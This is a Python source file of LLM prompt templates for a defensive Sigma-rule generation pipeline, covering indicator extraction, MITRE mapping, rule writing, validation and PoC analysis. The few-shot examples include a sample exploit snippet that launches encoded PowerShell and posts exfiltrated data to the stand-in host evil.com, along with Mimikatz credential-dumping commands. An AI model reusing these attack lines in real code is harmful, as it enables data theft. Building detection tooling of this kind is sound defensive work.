"""
Prompt templates for each pipeline stage.
Each prompt follows LLMCloudHunter principles:
- Role assignment
- Few-shot examples
- Structured JSON output instructions
- Focused, stage-specific scope
"""

# --- Stage 0: Intent Classification ---

INTENT_CLASSIFICATION = """You are a classification system for a Sigma rule generation assistant.

Classify the user's message into one of these intents:
- "generate_rule": The user wants to create a new Sigma detection rule (describes an attack, technique, or threat)
- "refine_rule": The user wants to modify, improve, or fix a previously generated rule
- "question": The user is asking a question about Sigma rules, detection, or cybersecurity
- "chat": The user is greeting, chatting, or the message is unrelated to security

### Conversation History
{history}

### Current Message
{message}

### Examples

Input: "Detect mimikatz credential dumping via LSASS memory access"
Output: {{"intent": "generate_rule", "reasoning": "User wants to detect a specific attack technique"}}

Input: "Can you add a filter for the admin account in that rule?"
Output: {{"intent": "refine_rule", "reasoning": "User wants to modify the previously generated rule"}}

Input: "What log source should I use for network connections?"
Output: {{"intent": "question", "reasoning": "User is asking for guidance, not requesting a rule"}}

Input: "Hello, how are you?"
Output: {{"intent": "chat", "reasoning": "User is greeting"}}

Respond with JSON only."""


# --- Stage 1: Image Transcription ---

IMAGE_TRANSCRIPTION = """You are a cybersecurity image analyst. Examine this image and extract all technical content relevant to threat detection.

Focus on extracting:
- Command lines, scripts, or code snippets
- Log entries or event data
- IP addresses, domain names, file paths
- Process names, service names
- Error messages or security alerts
- Network diagrams or architecture details
- Any indicators of compromise (IoCs)

If the image contains non-technical content (logos, decorative art, marketing), respond with: {{"is_technical": false, "transcription": ""}}

Otherwise, provide a detailed transcription in this JSON format:
{{"is_technical": true, "transcription": "<extracted technical content as text>"}}

Context from the user's message: {context}

Respond with JSON only."""


# --- Stage 2: Entity/Indicator Extraction ---

ENTITY_EXTRACTION = """You are a cybersecurity threat intelligence analyst specializing in indicator extraction from attack descriptions.

Analyze the following text and extract ALL threat indicators that could be used for building detection rules.

### Text to Analyze
{text}

### Extract these indicator types:
- **process**: Process or executable names (e.g., mimikatz.exe, powershell.exe, cmd.exe)
- **command_line**: Specific command-line patterns or arguments (e.g., "-dumpcreds", "Invoke-Mimikatz")
- **file_path**: File paths or filenames (e.g., C:\\Windows\\Temp\\payload.exe, /etc/shadow)
- **registry_key**: Windows registry keys or values
- **ip_address**: IP addresses (IPv4/IPv6)
- **domain**: Domain names or URLs
- **port**: Network ports
- **user_agent**: HTTP user agent strings
- **api_call**: Windows API calls or cloud API calls (e.g., VirtualAlloc, GetObject)
- **tool_name**: Known attack tools or malware names (e.g., Cobalt Strike, Mimikatz, BloodHound)
- **event_id**: Log event IDs (e.g., Sysmon Event ID 1, Windows Event ID 4688)
- **hash**: File hashes (MD5, SHA1, SHA256)
- **service_name**: Windows service names or cloud service names
- **other**: Any other relevant indicator

### Few-shot Examples

**Input**: "The attacker used mimikatz to dump LSASS memory. They ran sekurlsa::logonpasswords from C:\\Temp\\mimi.exe"
**Output**:
{{
  "indicators": [
    {{"value": "mimikatz", "type": "tool_name", "context": "attacker used mimikatz to dump LSASS memory", "confidence": "high"}},
    {{"value": "lsass.exe", "type": "process", "context": "dump LSASS memory", "confidence": "high"}},
    {{"value": "sekurlsa::logonpasswords", "type": "command_line", "context": "ran sekurlsa::logonpasswords", "confidence": "high"}},
    {{"value": "C:\\\\Temp\\\\mimi.exe", "type": "file_path", "context": "ran from C:\\\\Temp\\\\mimi.exe", "confidence": "high"}},
    {{"value": "mimi.exe", "type": "process", "context": "executable name mimi.exe", "confidence": "high"}}
  ],
  "attack_summary": "Credential dumping attack using Mimikatz tool to extract logon passwords from LSASS process memory.",
  "suggested_log_sources": ["sysmon", "windows_security"]
}}

**Input**: "Attackers performed lateral movement using PsExec to create a remote service on port 445. They connected from 10.0.0.5 to 10.0.0.20."
**Output**:
{{
  "indicators": [
    {{"value": "psexec.exe", "type": "process", "context": "lateral movement using PsExec", "confidence": "high"}},
    {{"value": "PsExec", "type": "tool_name", "context": "lateral movement using PsExec", "confidence": "high"}},
    {{"value": "445", "type": "port", "context": "create a remote service on port 445", "confidence": "high"}},
    {{"value": "10.0.0.5", "type": "ip_address", "context": "connected from 10.0.0.5", "confidence": "high"}},
    {{"value": "10.0.0.20", "type": "ip_address", "context": "connected to 10.0.0.20", "confidence": "high"}}
  ],
  "attack_summary": "Lateral movement using PsExec tool to execute commands on remote systems via SMB port 445.",
  "suggested_log_sources": ["sysmon", "windows_security", "windows_system"]
}}

Be thorough - extract BOTH explicitly mentioned AND implicitly referenced indicators.
Respond with JSON only."""


# --- Stage 3: TTP Mapping ---

TTP_MAPPING = """You are a MITRE ATT&CK classification expert. Map the following attack indicators and summary to the most relevant MITRE ATT&CK techniques.

### Attack Summary
{attack_summary}

### Extracted Indicators
{indicators}

### Reference MITRE ATT&CK Context (from knowledge base)
{mitre_context}

### Instructions
1. Map each relevant attack behavior to specific MITRE ATT&CK techniques
2. Use the full technique ID including sub-techniques where applicable (e.g., T1003.001, not just T1003)
3. Assign a severity level based on the potential impact
4. Focus on techniques that are directly evidenced by the indicators, not speculative

### Few-shot Examples

**Input Summary**: "Credential dumping using Mimikatz targeting LSASS"
**Output**:
{{
  "mappings": [
    {{
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "tactic": "Credential Access",
      "relevance": "Mimikatz sekurlsa::logonpasswords directly dumps credentials from LSASS process memory",
      "severity": "high"
    }}
  ]
}}

**Input Summary**: "Lateral movement via PsExec creating remote services"
**Output**:
{{
  "mappings": [
    {{
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "relevance": "PsExec uses SMB admin shares to copy and execute files on remote systems",
      "severity": "high"
    }},
    {{
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "tactic": "Execution",
      "relevance": "PsExec creates a temporary service on the remote system to execute commands",
      "severity": "medium"
    }}
  ]
}}

Respond with JSON only."""


# --- Stage 4: Rule Generation ---

RULE_GENERATION = """You are an expert Sigma rule author. Generate detection rules based on the analyzed threat intelligence below.

### Current Date: {current_date}

### Attack Summary
{attack_summary}

### Extracted Threat Indicators
{indicators}

### MITRE ATT&CK Mappings
{ttp_mappings}

### Similar Existing Sigma Rules (for reference)
{sigma_context}

### Relevant Log Source Information
{sysmon_context}

### Conversation History (for refinement context)
{history}

### User's Original Request
{user_query}

### Instructions
1. Generate one or more Sigma rules that detect the described attack behavior
2. Each rule MUST include: title, id (valid UUID), status, description, author, date, tags, logsource, detection, falsepositives, level
3. Author MUST be "Sigma Assistant"
4. Date MUST be "{current_date}"
5. Tags MUST use the format "attack.tXXXX" for MITRE techniques and "attack.<tactic_name>" for tactics
6. Detection logic must use proper Sigma field names for the chosen log source
7. Include specific detection criteria based on the extracted indicators
8. If multiple distinct detection opportunities exist, generate separate rules
9. Pay attention to small details in the indicators - they improve detection specificity

### Few-shot Example

**Input**: Attack using mimikatz targeting LSASS, indicators: mimikatz.exe, lsass.exe, sekurlsa::logonpasswords
**Output**:
{{
  "rules": [
    {{
      "yaml_content": "title: Mimikatz Credential Dumping via LSASS Access\\nid: 12345678-1234-1234-1234-123456789abc\\nstatus: experimental\\ndescription: Detects potential credential dumping using Mimikatz by monitoring for suspicious access to the LSASS process.\\nauthor: Sigma Assistant\\ndate: {current_date}\\ntags:\\n    - attack.credential_access\\n    - attack.t1003.001\\nlogsource:\\n    category: process_access\\n    product: windows\\ndetection:\\n    selection:\\n        TargetImage|endswith: '\\\\lsass.exe'\\n        SourceImage|endswith:\\n            - '\\\\mimikatz.exe'\\n            - '\\\\mimi.exe'\\n        GrantedAccess|contains:\\n            - '0x1010'\\n            - '0x1410'\\n    condition: selection\\nfalsepositives:\\n    - Legitimate security scanning tools\\n    - Antivirus software accessing LSASS\\nlevel: high",
      "explanation": "This rule detects Mimikatz credential dumping by monitoring process access events targeting LSASS with suspicious access rights.",
      "target_ttp": "T1003.001"
    }}
  ],
  "notes": ""
}}

Respond with JSON only."""


# --- Stage 5: Validation (LLM semantic review) ---

RULE_VALIDATION = """You are a Sigma rule quality reviewer. Review the following Sigma rule(s) for logical correctness and detection effectiveness.

### Generated Rules
{rules}

### Original Attack Description
{attack_summary}

### Extracted Indicators
{indicators}

### Check for these issues:
1. **Field name correctness**: Are the field names valid for the specified log source? (e.g., Sysmon uses 'Image', 'CommandLine', 'TargetFilename'; Windows Security uses 'ProcessName', 'SubjectUserName')
2. **Detection logic**: Does the detection logic actually detect the described attack? Are there logical errors?
3. **Condition syntax**: Is the condition field correctly referencing the selection names?
4. **Completeness**: Are important indicators missing from the detection?
5. **Over-specificity**: Is the rule too specific to be useful (e.g., hardcoded temp file names)?
6. **Under-specificity**: Is the rule too broad and will generate excessive false positives?

For each rule, report any issues found. If a rule has errors, provide the corrected YAML.

Respond with JSON in this format:
{{
  "is_valid": true/false,
  "issues": [
    {{"severity": "error|warning|info", "field": "field_name", "message": "description"}}
  ],
  "corrected_rules": ["corrected yaml if needed, or original yaml if no changes"]
}}

Respond with JSON only."""


# --- Stage 6: Optimization ---

RULE_OPTIMIZATION = """You are a Sigma rule optimization expert. Improve the following validated Sigma rules.

### Rules to Optimize
{rules}

### Extracted IoCs (for enrichment)
{iocs}

### Perform these optimizations:
1. **Selection Unification**: If multiple selection criteria share the same filtering logic, merge them into one selection
2. **Selection Separation**: If a selection contains unrelated detection criteria, split them into separate selections with OR logic
3. **IoC Enrichment**: If relevant IP addresses, domains, or user agents were extracted, add them as OPTIONAL detection filters using additional selection fields and OR logic in the condition (e.g., `selection and (selection_ioc_ip or selection_ioc_domain)` becomes `selection or (selection and selection_ioc_ip)`)
4. **False Positive Refinement**: Add reasonable false positive entries if missing
5. **Deduplication**: If multiple rules detect the same behavior, keep only the most comprehensive one

### IoC Enrichment Example
If IPs [10.0.0.5] were extracted, add:
```
selection_ioc_ip:
    SourceIP:
        - '10.0.0.5'
```
And update condition from `selection` to `selection and selection_ioc_ip` or keep IoCs as optional with `selection or (selection and selection_ioc_ip)`

### Instructions
- Only make changes that genuinely improve detection quality
- If no optimizations are needed, return rules unchanged with empty changes_made
- Preserve the original detection intent
- IoCs should be added as OPTIONAL filters (analysts can remove them)

Respond with JSON:
{{
  "rules": [
    {{
      "yaml_content": "the optimized YAML",
      "changes_made": ["list of changes made to this rule"]
    }}
  ],
  "summary": "brief summary of all optimizations"
}}

Respond with JSON only."""


# --- Web Search Query Extraction (Improvement 1) ---

WEB_SEARCH_QUERIES = """You are a cybersecurity research assistant. Given the user's input about a threat or vulnerability, generate 2-3 targeted web search queries that would find additional technical details useful for building a detection rule.

### User Input
{text}

### Instructions
- Focus on finding: CVE details, exploit PoC code, IoCs, detection guidance, log analysis
- If a CVE ID is mentioned, always include it in a query
- If a malware/tool name is mentioned, search for its technical analysis
- Prefer searches that will return technical writeups, not news articles
- Keep queries concise and specific

### Examples

**Input**: "Detect CVE-2024-1234 exploitation in Apache Struts"
**Output**:
{{
  "queries": [
    "CVE-2024-1234 Apache Struts exploit PoC indicators of compromise",
    "CVE-2024-1234 detection Sigma YARA rule",
    "Apache Struts CVE-2024-1234 log analysis forensics"
  ]
}}

**Input**: "Create a rule to detect Cobalt Strike beacon activity"
**Output**:
{{
  "queries": [
    "Cobalt Strike beacon detection indicators network traffic",
    "Cobalt Strike named pipe process injection Sigma rule",
    "Cobalt Strike malleable C2 profile forensic artifacts"
  ]
}}

Respond with JSON only."""


# --- Log Source Suggestion (Improvement 2) ---

LOG_SOURCE_SUGGESTION = """You are a Sigma rule log source expert. Given the extracted indicators and MITRE ATT&CK mappings, determine the most appropriate log sources for detection.

### Attack Summary
{attack_summary}

### Extracted Indicators
{indicators}

### MITRE ATT&CK Mappings
{ttp_mappings}

### Reference: Common Sigma Log Source Categories and Fields

| Category | Product | Service | Typical Fields |
|----------|---------|---------|----------------|
| process_creation | windows | sysmon | Image, CommandLine, ParentImage, ParentCommandLine, User, IntegrityLevel |
| process_creation | windows | security | NewProcessName, CommandLine, ParentProcessName, SubjectUserName |
| process_creation | linux | auditd | exe, comm, a0, a1, ppid, uid |
| process_access | windows | sysmon | SourceImage, TargetImage, GrantedAccess, CallTrace |
| file_event | windows | sysmon | TargetFilename, Image, CreationUtcTime |
| file_change | windows | sysmon | TargetFilename, Image |
| registry_event | windows | sysmon | TargetObject, Details, Image, EventType |
| network_connection | windows | sysmon | DestinationIp, DestinationPort, SourceIp, Image, Initiated |
| dns_query | windows | sysmon | QueryName, QueryResults, Image |
| image_load | windows | sysmon | ImageLoaded, Image, Signed, SignatureStatus |
| pipe_created | windows | sysmon | PipeName, Image |
| wmi_event | windows | sysmon | EventType, Operation, User |
| ps_script | windows | powershell | ScriptBlockText, ScriptBlockId |
| ps_module | windows | powershell | ContextInfo, Payload |
| webserver | linux/windows | apache/iis/nginx | cs-uri-query, cs-method, c-ip, sc-status |
| firewall | - | - | src_ip, dst_ip, dst_port, action |
| proxy | - | - | cs-host, cs-uri, c-uri-extension, c-useragent |
| cloud | aws | cloudtrail | eventName, eventSource, sourceIPAddress, userIdentity |
| cloud | azure | activitylogs | operationName, callerIpAddress, properties |
| cloud | gcp | audit | methodName, callerIp, serviceName |

### Instructions
1. Analyze the indicators and TTPs to determine WHICH log sources would capture the described behavior
2. Rank suggestions by confidence (how likely this log source captures the attack)
3. Include relevant field names for each suggested log source
4. Consider both primary and secondary detection opportunities
5. The primary_source should be the single best log source for this specific attack

### Example

**Input**: Attack using Mimikatz targeting LSASS memory
**Output**:
{{
  "suggestions": [
    {{
      "category": "process_access",
      "product": "windows",
      "service": "sysmon",
      "confidence": 0.95,
      "reasoning": "LSASS memory access is directly captured by Sysmon Event ID 10 (ProcessAccess) with GrantedAccess flags",
      "relevant_fields": ["SourceImage", "TargetImage", "GrantedAccess", "CallTrace"]
    }},
    {{
      "category": "process_creation",
      "product": "windows",
      "service": "sysmon",
      "confidence": 0.8,
      "reasoning": "Mimikatz process execution would be captured by process creation events",
      "relevant_fields": ["Image", "CommandLine", "ParentImage"]
    }}
  ],
  "primary_source": "process_access (Sysmon Event ID 10)"
}}

Respond with JSON only."""


# --- PoC Code Analysis (Improvement 4) ---

POC_CODE_ANALYSIS = """You are a cybersecurity exploit analyst. Analyze the following code snippet(s) and extract behavioral indicators that could be used for detection in security logs.

### Code Snippet(s)
{code_snippets}

### Instructions
Focus on OBSERVABLE BEHAVIORS that would appear in logs, not the code logic itself:
1. **Processes spawned**: Any system commands, executables, or shells invoked
2. **Commands executed**: Specific command-line arguments or patterns
3. **Files created/modified/deleted**: File paths, temporary files, dropped payloads
4. **Network connections**: Outbound connections, URLs, IPs, ports, protocols
5. **Registry modifications**: Registry keys created or modified
6. **API calls**: Notable Windows API calls (VirtualAlloc, CreateRemoteThread, etc.)
7. **Service operations**: Services created, modified, or started
8. **Evasion techniques**: Process injection, hollowing, encoding, obfuscation methods

### Example

**Input Code**:
```python
import subprocess
subprocess.Popen(["powershell", "-enc", encoded_payload])
os.makedirs("C:\\\\Windows\\\\Temp\\\\svc")
requests.post("http://evil.com:8443/beacon", data=exfil_data)
```

**Output**:
{{
  "behavioral_indicators": [
    {{"value": "powershell.exe", "type": "process", "context": "PowerShell spawned by Python exploit", "confidence": "high"}},
    {{"value": "-enc", "type": "command_line", "context": "Encoded PowerShell command execution - common evasion", "confidence": "high"}},
    {{"value": "C:\\\\Windows\\\\Temp\\\\svc", "type": "file_path", "context": "Suspicious directory created in Windows Temp", "confidence": "high"}},
    {{"value": "evil.com", "type": "domain", "context": "C2 callback domain", "confidence": "high"}},
    {{"value": "8443", "type": "port", "context": "Non-standard HTTPS port for C2 beacon", "confidence": "medium"}}
  ],
  "attack_flow": "The exploit spawns PowerShell with an encoded payload, creates a staging directory in Windows Temp, and exfiltrates data to a C2 server over port 8443."
}}

Be thorough - extract every observable behavior from the code. If you cannot determine the language or the code is obfuscated, still extract what you can.
Respond with JSON only."""


# --- Conversational Response (for chat/question intents) ---

CONVERSATIONAL = """You are a helpful Sigma Rule Assistant. You help security analysts create detection rules.

Current Date: {current_date}

### Conversation History
{history}

### User Message
{message}

### Knowledge Base Context
**Similar Rules:** {sigma_context}
**MITRE:** {mitre_context}
**Sysmon:** {sysmon_context}

Respond naturally and helpfully. If the user is asking about detection or Sigma rules, provide useful guidance. If they're greeting you, be friendly and offer to help with Sigma rule creation."""
